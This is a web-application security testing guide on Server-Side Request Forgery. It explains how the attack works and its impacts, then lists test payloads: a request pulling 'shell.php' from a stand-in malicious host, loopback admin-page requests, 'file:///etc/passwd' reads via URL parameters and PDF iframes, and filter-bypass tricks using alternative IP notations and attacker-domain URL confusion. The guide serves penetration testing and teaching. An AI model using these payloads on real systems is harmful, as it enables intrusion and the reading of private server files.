<h1>What is Server-Sider Request Forgery</h1>
Web applications often interact with internal or external resources. While you may expect that only the intended resource will be handling the data you send, improperly handled data may create a situation where injection attacks are possible. One type of injection attack is called Server-side Request Forgery (SSRF). A successful SSRF attack can grant the attacker access to restricted actions, internal services, or internal files within the application or the organization. In some cases, it can even lead to Remote Code Execution (RCE).

<h2>How SSRF Works:</h2>
Server-Side Request Forgery (SSRF) is a vulnerability where an attacker manipulates a server to make unintended requests. This can lead to unauthorized access to internal services, data exfiltration, authentication bypass, or even remote code execution. Mitigation involves input validation, URL whitelisting, network segmentation, metadata protection, and using proxies.

- **Attack Vector**: An attacker finds an input field or an endpoint where they can inject a URL or IP address.
- **Malicious Request**: The attacker crafts a request that forces the server to make an HTTP request to a specified location.
- **Internal Network Access**: If the server has access to internal services, the attacker can exploit this to access internal-only services, potentially exposing sensitive data or functionalities.
- **External Network Access**: Attackers can also direct the server to make requests to external systems, potentially leaking server responses, internal configurations, or other sensitive data.

<h2>Potential Impacts:</h2>
A successful SSRF attack can often result in unauthorized actions or access to data within the organization. This can be in the vulnerable application, or on other back-end systems that the application can communicate with. In some situations, the SSRF vulnerability might allow an attacker to perform arbitrary command execution.

An SSRF exploit that causes connections to external third-party systems might result in malicious onward attacks. These can appear to originate from the organization hosting the vulnerable application.

- **Internal Network Exploration**: Attackers can use SSRF to scan and map the internal network, discovering other services and applications.
- **Data Exfiltration**: Sensitive data, such as configuration files, internal API responses, or metadata, can be extracted.
- **Authentication Bypass**: Attackers might access internal services that do not require authentication or are weakly protected.
- **Remote Code Execution**: In some cases, SSRF can lead to remote code execution if the attacker can access services that have such vulnerabilities.

<h1>Test Objectives:</h1>
- Identify SSRF injection points.
- Test if the injection points are exploitable.
- Asses the severity of the vulnerability.

<h1>How to Test:</h1>
When testing for SSRF, you attempt to make the targeted server inadvertently load or save content that could be malicious. The most common test is for local and remote file inclusion. There is also another facet to SSRF: a trust relationship that often arises where the application server is able to interact with other back-end systems that are not directly reachable by users. These back-end systems often have non-routable private IP addresses or are restricted to certain hosts. Since they are protected by the network topology, they often lack more sophisticated controls. These internal systems often contain sensitive data or functionality.

Consider the following request:
```
GET https://example.com/page?page=about.php
```

You can test this request with the following payloads:
<h3>Load the Contents of a File:</h3>
```
GET https://example.com/page?page=https://malicioussite.com/shell.php
```

<h3>Access a Restricted Page:</h3>
`GET https://example.com/page?page=http://localhost/admin`
Or:

GET https://example.com/page?page=http://127.0.0.1/admin


Use the loopback interface to access content restricted to the host only. This mechanism implies that if you have access to the host, you also have privileges to directly access the `admin` page.

These kind of trust relationships, where requests originating from the local machine are handled differently than ordinary requests, are often what enables SSRF to be a critical vulnerability.

<h3>Fetch a Local File:</h3>
GET https://example.com/page?page=file:///etc/passwd

<h3>HTTP Methods Used:</h3>
All of the payloads above can apply to any type of HTTP request, and could also be injected into header and cookie values as well.

One important note on SSRF with POST requests is that the SSRF may also manifest in a blind manner, because the application may not return anything immediately. Instead, the injected data may be used in other functionality such as PDF reports, invoice or order handling, etc., which may be visible to employees or staff but not necessarily to the end user or tester.

<h3>PDF Generators:</h3>
In some cases, a server may convert uploaded files to PDF format. Try injecting `<iframe>`, `<img>`, `<base>`, or `<script>` elements, or CSS `url()` functions pointing to internal services.
```
<iframe src="file:///etc/passwd" width="400" height="400">
<iframe src="file:///c:/windows/win.ini" width="400" height="400">
```

<h3>Common Filter Bypass:</h3>
Some applications block references to `localhost` and `127.0.0.1`. This can be circumvented by:

- Using alternative IP representation that evaluate to `127.0.0.1`:
    - Decimal notation: `2130706433`
    - Octal notation: `017700000001`
    - IP shortening: `127.1`
- String obfuscation
- Registering your own domain that resolves to `127.0.0.1`

Sometimes the application allows input that matches a certain expression, like a domain. That can be circumvented if the URL schema parser is not properly implemented, resulting in attacks similar to semantic attacks.

- Using the `@` character to separate between the userinfo and the host: `https://expected-domain@attacker-domain`
- URL fragmentation with the `#` character: `https://attacker-domain#expected-domain`
- URL encoding
- Fuzzing
- Combinations of all of the above
